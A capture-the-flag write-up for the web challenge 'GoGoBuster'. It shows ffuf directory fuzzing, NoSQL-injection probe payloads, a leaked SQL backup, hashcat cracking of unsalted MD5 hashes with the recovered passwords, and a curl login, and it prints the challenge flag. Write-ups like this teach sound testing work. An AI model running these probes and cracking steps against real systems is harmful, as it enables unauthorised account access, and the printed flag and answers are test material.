# GoGoBuster — web, easy — 1000 pts

**Flag:** `HTB{s3ns1t1v3_d4t4_3xp0sur3_4t_1ts_f1n3st_14be5cbf4feaad2403c6ed44ba598e16}`

Black-box. The name tells you the answer, and we still nearly talked ourselves out of it — this
writeup keeps the wrong turns in, because they are the lesson.

---

## Step 1 — map the surface (and find almost nothing)

```
/            302 -> /login
/login       200   (page title: "MFlow")
/dashboard   403   unauthenticated
/api/login   POST, JSON {username, password}
/static/*    assets
```

Roughly fifteen other obvious paths — `/api/users`, `/api/flag`, `/api/admin`, `/api/download`,
`/register`, `/admin`, `/console`, `/debug`, `robots.txt`, `.git/HEAD` — all return hard 404s.
`/static/js/login.js` is the entire client and does nothing but POST to `/api/login`.

## Step 2 — two decoys that ate time

**Decoy 1.** `/login` contains a planted comment:

```html
<!-- TODO: remove guest:guest account -->
```

`guest:guest` is rejected. It is bait.

**Decoy 2, the expensive one.** Probing `/api/login` with type confusion:

| body | response |
|---|---|
| `{"username":"x","password":"y"}` | `Invalid login` (400) |
| `{"username":[], ...}` | `Insufficient parameters` |
| `{"username":123, ...}` | `Invalid login` |
| `{"username":"x","password":{"$ne":"y"}}` | `Invalid login` |
| **`{"username":{"$ne":null},"password":{"$ne":null}}`** | **HTTP 500** |

A dict in `username` crashes the server while a dict in `password` does not. That asymmetry looks
exactly like a NoSQL injection surface, and it is tempting to conclude the app is Mongo-backed and
the 500 is one payload away from an auth bypass.

**It is not.** A working `$ne` bypass logs you *in*; it does not 500. The crash is an ordinary
`AttributeError` from a string operation (`.lower()`, concatenation) applied to a dict before the
password is ever compared. It is a dead end, and chasing it cost more than the actual solve.

## Step 3 — do what the name says

```console
$ ffuf -u http://$HOST:$PORT/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 2 -fs 28
```

Two flags matter here:

- **`-fs 28`** filters the 28-byte JSON 404 body. Without it `/backups` drowns in noise — this is
  why an unfiltered fuzz (ours, first time round) misses the whole challenge.
- **`-t 2`** because these instances are single-threaded; at the default 40 threads the server
  queues and *looks* dead.

Result: **`/backups`** (plus `/staticpages`).

## Step 4 — loot the backup directory

`/backups/` is an **nginx autoindex** — directory listing enabled — containing:

```
invoices.csv
mflow_sales_management_20240404.sql
```

The SQL dump's `users` table:

| user | md5 | is_admin |
|---|---|---|
| `admin` | `5416d7cd6ef195a0f7622a9c56b55e84` | 1 |
| `alex.turner` | … | 0 |
| `lily.evans` | … | 0 |
| `james.potter` | … | 0 |

Unsalted MD5. Both of these work:

```console
$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # seconds
```

or a reverse-lookup service, which returned all four in a single query:

```
admin        -> 1q2w3e4r
alex.turner  -> password123
lily.evans   -> password123!
james.potter -> password123@
```

## Step 5 — log in

```console
$ curl -s -i -X POST http://$HOST:$PORT/api/login \
       -H 'Content-Type: application/json' \
       -d '{"username":"admin","password":"1q2w3e4r"}'
{"message":"Login successful","success":true}
Set-Cookie: session=...
$ curl -s -b 'session=...' http://$HOST:$PORT/dashboard
... HTB{s3ns1t1v3_d4t4_3xp0sur3_4t_1ts_f1n3st_14be5cbf4feaad2403c6ed44ba598e16} ...
```

Unlike MFlow, this `session` cookie is properly Flask-signed — the shared page title is cosmetic and
the MFlow cookie-forgery attack does not transfer.

---

## Lessons

- **`-fs` / `-fw` filtering is not optional** against an app with a uniform JSON 404. A content-discovery
  run without a size filter is a run that finds nothing.
- **Keep fuzz concurrency at 1–2** against single-threaded Python/Flask targets. High thread counts
  produce queue-induced timeouts that read as "host is down".
- **A 500 is not a vulnerability.** Distinguish "I crashed the parser" from "I changed the query's
  meaning". If the bypass would have logged you in, an error page means you are on the wrong path.
- When a challenge's name states the technique, exhaust that technique properly before deciding it
  is misdirection.
- **Check `work/` for a predecessor's artifacts.** The `/backups` hit was already sitting in a prior
  `ffuf` output file on disk; two of us re-derived it independently.
